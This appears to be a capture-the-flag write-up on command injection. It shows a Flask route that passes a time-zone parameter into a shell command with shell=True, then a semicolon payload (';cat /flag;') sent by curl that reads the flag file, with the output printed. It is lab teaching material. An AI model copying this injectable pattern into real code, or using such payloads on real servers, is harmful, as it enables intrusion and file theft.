# Command Injection 4

Like the previous challenge, we get a `/challenge/server` that runs a command using `subprocess.run()`. This time, the server injects `arg` into `command`
into a different part of the `command`:

```python
@app.route("/milestone", methods=["GET"])
def challenge():
    arg = flask.request.args.get("time-zone", "MST")
    command = f"TZ={arg} date"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout
```

This time, `arg` is being injected into an assignment of an environment variable. Although the author expects us to input a timezone,
we can simply use `;` again to set `TZ` equal to nothing, and then run our own command. To deal with the `date`, we can have it run or
have `cat` attempt to read a file named `date`, which will most likely error out. We will go with the former:

```bash
TZ=;cat /flag; date
   ^ start of arg
```

This is what the payload will look like:

```bash
curl "challenge.localhost:80/milestone?time-zone=;cat%20/flag;"
```

And this is the html response:

```html
<b>Output of TZ=;cat /flag; date:</b><br>
    <pre>
        flag{good_job}
        Mon Oct  5 23:42:55 UTC 2026
    </pre>
```

We know have the flag and the output of the date command, with `TZ` environment set to blank!